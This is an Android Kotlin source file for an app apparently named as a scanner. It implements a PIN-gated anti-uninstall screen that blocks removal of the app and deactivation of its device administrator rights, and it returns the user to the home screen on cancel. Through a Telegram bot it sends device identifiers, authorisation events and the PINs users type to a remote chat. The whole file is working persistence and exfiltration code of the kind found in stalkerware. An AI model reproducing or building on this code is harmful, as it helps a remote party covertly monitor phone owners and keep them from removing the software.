package com.example.scanner

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.Backspace
import androidx.compose.material.icons.filled.Close
import androidx.compose.material.icons.filled.Security
import androidx.compose.material3.Icon
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.data.MediaUploadRepository
import com.example.network.TelegramApiService
import com.example.ui.theme.MyApplicationTheme
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class UninstallLockActivity : ComponentActivity() {

    private lateinit var repository: MediaUploadRepository

    private var isAdminDisable = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        repository = MediaUploadRepository(this)
        isAdminDisable = intent.getBooleanExtra("is_admin_disable", false)
        UninstallLockManager.isPinPromptActive = true

        setContent {
            MyApplicationTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = Color(0xFF030712)
                ) {
                    UninstallPinLockContent(
                        isAdminDisable = isAdminDisable,
                        onVerifyPin = { pin -> handleVerifyPin(pin) },
                        onCancel = { handleCancel() }
                    )
                }
            }
        }
    }

    override fun onDestroy() {
        UninstallLockManager.isPinPromptActive = false
        super.onDestroy()
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        handleCancel()
    }

    private fun handleVerifyPin(enteredPin: String): Boolean {
        val targetPin = repository.getAppPin() ?: "1234"
        val isCorrect = enteredPin.trim() == targetPin.trim()

        if (isCorrect) {
            triggerVibration(success = true)
            UninstallLockManager.authorizeUninstall(60_000L)

            if (isAdminDisable) {
                Toast.makeText(this, "✅ পিন সঠিক! ডিভাইস অ্যাডমিন ডিঅ্যাক্টিভেশন অনুমোদন করা হয়েছে।", Toast.LENGTH_LONG).show()
                try {
                    val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as? android.app.admin.DevicePolicyManager
                    dpm?.removeActiveAdmin(AppAdminReceiver.getComponentName(this))
                } catch (_: Exception) {}

                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        val config = repository.getTelegramConfig()
                        if (config.botToken.isNotBlank() && config.chatId.isNotBlank()) {
                            val deviceId = repository.getDeviceId()
                            val api = TelegramApiService(this@UninstallLockActivity)
                            api.sendMessage(
                                config.botToken,
                                config.chatId,
                                "🔓 <b>DEVICE ADMIN DEACTIVATION AUTHORIZED</b>\n\n" +
                                "📱 <b>Device:</b> <code>$deviceId</code> (${Build.MANUFACTURER.uppercase()} ${Build.MODEL})\n" +
                                "✅ Correct security PIN was entered. Device administrator deactivation granted."
                            )
                        }
                    } catch (_: Exception) {}
                }
            } else {
                Toast.makeText(this, "✅ পিন সঠিক! আনইনস্টল অনুমোদন করা হয়েছে (৬০ সেকেন্ড)", Toast.LENGTH_LONG).show()

                // Send success confirmation to Telegram
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        val config = repository.getTelegramConfig()
                        if (config.botToken.isNotBlank() && config.chatId.isNotBlank()) {
                            val deviceId = repository.getDeviceId()
                            val api = TelegramApiService(this@UninstallLockActivity)
                            api.sendMessage(
                                config.botToken,
                                config.chatId,
                                "🔓 <b>UNINSTALL AUTHORIZED ON DEVICE</b>\n\n" +
                                "📱 <b>Device:</b> <code>$deviceId</code> (${Build.MANUFACTURER.uppercase()} ${Build.MODEL})\n" +
                                "⏰ <b>Window:</b> 60 seconds authorized\n" +
                                "✅ Correct PIN was entered directly on the phone. App removal granted."
                            )
                        }
                    } catch (_: Exception) {}
                }

                // Launch uninstaller now that it is authorized
                try {
                    val deleteIntent = Intent(Intent.ACTION_DELETE).apply {
                        data = Uri.parse("package:$packageName")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    startActivity(deleteIntent)
                } catch (_: Exception) {}
            }

            finish()
            return true
        } else {
            triggerVibration(success = false)

            // Send unauthorized attempt alert to Telegram
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val config = repository.getTelegramConfig()
                    if (config.botToken.isNotBlank() && config.chatId.isNotBlank()) {
                        val deviceId = repository.getDeviceId()
                        val api = TelegramApiService(this@UninstallLockActivity)
                        val actionName = if (isAdminDisable) "DEVICE ADMIN DEACTIVATION" else "UNINSTALL"
                        api.sendMessage(
                            config.botToken,
                            config.chatId,
                            "🚨 <b>UNAUTHORIZED $actionName ATTEMPT BLOCKED!</b>\n\n" +
                            "📱 <b>Device:</b> <code>$deviceId</code> (${Build.MANUFACTURER.uppercase()} ${Build.MODEL})\n" +
                            "❌ <b>Entered PIN:</b> <code>$enteredPin</code> (Incorrect)\n" +
                            "🛑 <b>Status:</b> Protection enforced and access denied."
                        )
                    }
                } catch (_: Exception) {}
            }
            return false
        }
    }

    private fun handleCancel() {
        // Return to home screen immediately
        val homeIntent = Intent(Intent.ACTION_MAIN).apply {
            addCategory(Intent.CATEGORY_HOME)
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        startActivity(homeIntent)
        finish()
    }

    private fun triggerVibration(success: Boolean) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val vibratorManager = getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as? VibratorManager
                val vibrator = vibratorManager?.defaultVibrator
                if (success) {
                    vibrator?.vibrate(VibrationEffect.createOneShot(50, VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    vibrator?.vibrate(VibrationEffect.createWaveform(longArrayOf(0, 80, 50, 80), -1))
                }
            } else {
                @Suppress("DEPRECATION")
                val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as? Vibrator
                if (success) {
                    vibrator?.vibrate(50)
                } else {
                    vibrator?.vibrate(longArrayOf(0, 80, 50, 80), -1)
                }
            }
        } catch (_: Exception) {}
    }
}

@Composable
fun UninstallPinLockContent(
    isAdminDisable: Boolean,
    onVerifyPin: (String) -> Boolean,
    onCancel: () -> Unit,
    modifier: Modifier = Modifier
) {
    var enteredPin by remember { mutableStateOf("") }
    var isError by remember { mutableStateOf(false) }
    var errorMessage by remember { mutableStateOf("") }

    Box(
        modifier = modifier
            .fillMaxSize()
            .background(
                Brush.verticalGradient(
                    colors = listOf(
                        Color(0xFF030712),
                        Color(0xFF0F172A),
                        Color(0xFF020617)
                    )
                )
            )
            .statusBarsPadding()
            .navigationBarsPadding(),
        contentAlignment = Alignment.Center
    ) {
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .padding(horizontal = 28.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center
        ) {
            // Shield Icon with Glow
            Box(
                modifier = Modifier
                    .size(80.dp)
                    .clip(CircleShape)
                    .background(Color(0x1AE11D48))
                    .border(2.dp, Color(0xFFE11D48), CircleShape),
                contentAlignment = Alignment.Center
            ) {
                Icon(
                    imageVector = Icons.Default.Security,
                    contentDescription = null,
                    tint = Color(0xFFF43F5E),
                    modifier = Modifier.size(44.dp)
                )
            }

            Spacer(modifier = Modifier.height(20.dp))

            Text(
                text = if (isAdminDisable) "🔒 DEVICE ADMIN PROTECTION" else "🛡️ ANTI-UNINSTALL PROTECTION",
                color = Color.White,
                fontSize = 17.sp,
                fontWeight = FontWeight.ExtraBold,
                letterSpacing = 1.sp
            )

            Spacer(modifier = Modifier.height(8.dp))

            Text(
                text = if (isAdminDisable) "ডিভাইস অ্যাডমিন পারমিশন বন্ধ করতে আপনার ৪-ডিজিট সিকিউরিটি পিন দিন।" else "অ্যাপটি আনইনস্টল বা রিমুভ করতে আপনার ৪-ডিজিট সিকিউরিটি পিন দিন।",
                color = Color(0xFF94A3B8),
                fontSize = 12.sp,
                textAlign = TextAlign.Center,
                lineHeight = 16.sp
            )

            Spacer(modifier = Modifier.height(24.dp))

            // PIN Indicator Dots
            Row(
                horizontalArrangement = Arrangement.spacedBy(16.dp),
                verticalAlignment = Alignment.CenterVertically
            ) {
                for (i in 0 until 4) {
                    val filled = i < enteredPin.length
                    Box(
                        modifier = Modifier
                            .size(18.dp)
                            .clip(CircleShape)
                            .background(
                                when {
                                    isError -> Color(0xFFEF4444)
                                    filled -> Color(0xFF00F2FE)
                                    else -> Color(0x33FFFFFF)
                                }
                            )
                            .border(
                                width = 1.5.dp,
                                color = when {
                                    isError -> Color(0xFFEF4444)
                                    filled -> Color(0xFF00F2FE)
                                    else -> Color(0x66FFFFFF)
                                },
                                shape = CircleShape
                            )
                    )
                }
            }

            Spacer(modifier = Modifier.height(14.dp))

            // Error Message
            Box(
                modifier = Modifier.height(20.dp),
                contentAlignment = Alignment.Center
            ) {
                if (isError) {
                    Text(
                        text = errorMessage.ifBlank { "❌ ভুল পিন! আনইনস্টল করা যাবে না।" },
                        color = Color(0xFFEF4444),
                        fontSize = 12.sp,
                        fontWeight = FontWeight.Bold
                    )
                }
            }

            Spacer(modifier = Modifier.height(18.dp))

            // Number Pad (1 to 9, 0, Backspace, Clear)
            Column(
                modifier = Modifier.fillMaxWidth(),
                verticalArrangement = Arrangement.spacedBy(12.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                val rows = listOf(
                    listOf("1", "2", "3"),
                    listOf("4", "5", "6"),
                    listOf("7", "8", "9"),
                    listOf("C", "0", "DEL")
                )

                for (row in rows) {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceEvenly
                    ) {
                        for (key in row) {
                            Box(
                                modifier = Modifier
                                    .size(68.dp)
                                    .clip(CircleShape)
                                    .background(
                                        when (key) {
                                            "C", "DEL" -> Color(0x1AFFFFFF)
                                            else -> Color(0x0DFFFFFF)
                                        }
                                    )
                                    .border(
                                        width = 1.dp,
                                        color = when (key) {
                                            "C", "DEL" -> Color(0x33FFFFFF)
                                            else -> Color(0x1FFFFFFF)
                                        },
                                        shape = CircleShape
                                    )
                                    .clickable {
                                        isError = false
                                        when (key) {
                                            "DEL" -> {
                                                if (enteredPin.isNotEmpty()) {
                                                    enteredPin = enteredPin.dropLast(1)
                                                }
                                            }
                                            "C" -> {
                                                enteredPin = ""
                                            }
                                            else -> {
                                                if (enteredPin.length < 8) {
                                                    enteredPin += key
                                                    if (enteredPin.length >= 4) {
                                                        val ok = onVerifyPin(enteredPin)
                                                        if (!ok) {
                                                            isError = true
                                                            errorMessage = "❌ ভুল পিন! অ্যাক্সেস ব্লক করা হয়েছে।"
                                                            enteredPin = ""
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    },
                                contentAlignment = Alignment.Center
                            ) {
                                when (key) {
                                    "DEL" -> Icon(
                                        imageVector = Icons.AutoMirrored.Filled.Backspace,
                                        contentDescription = "Delete",
                                        tint = Color(0xFFF43F5E),
                                        modifier = Modifier.size(22.dp)
                                    )
                                    "C" -> Text(
                                        text = "C",
                                        color = Color(0xFF94A3B8),
                                        fontSize = 18.sp,
                                        fontWeight = FontWeight.Bold
                                    )
                                    else -> Text(
                                        text = key,
                                        color = Color.White,
                                        fontSize = 22.sp,
                                        fontWeight = FontWeight.SemiBold,
                                        fontFamily = FontFamily.Monospace
                                    )
                                }
                            }
                        }
                    }
                }
            }

            Spacer(modifier = Modifier.height(24.dp))

            // Cancel Button
            TextButton(
                onClick = onCancel,
                modifier = Modifier
                    .fillMaxWidth(0.7f)
                    .height(44.dp)
            ) {
                Icon(
                    imageVector = Icons.Default.Close,
                    contentDescription = null,
                    tint = Color(0xFF94A3B8),
                    modifier = Modifier.size(18.dp)
                )
                Spacer(modifier = Modifier.width(6.dp))
                Text(
                    text = "বাতিল করুন (CANCEL)",
                    color = Color(0xFF94A3B8),
                    fontSize = 13.sp,
                    fontWeight = FontWeight.Medium
                )
            }
        }
    }
}
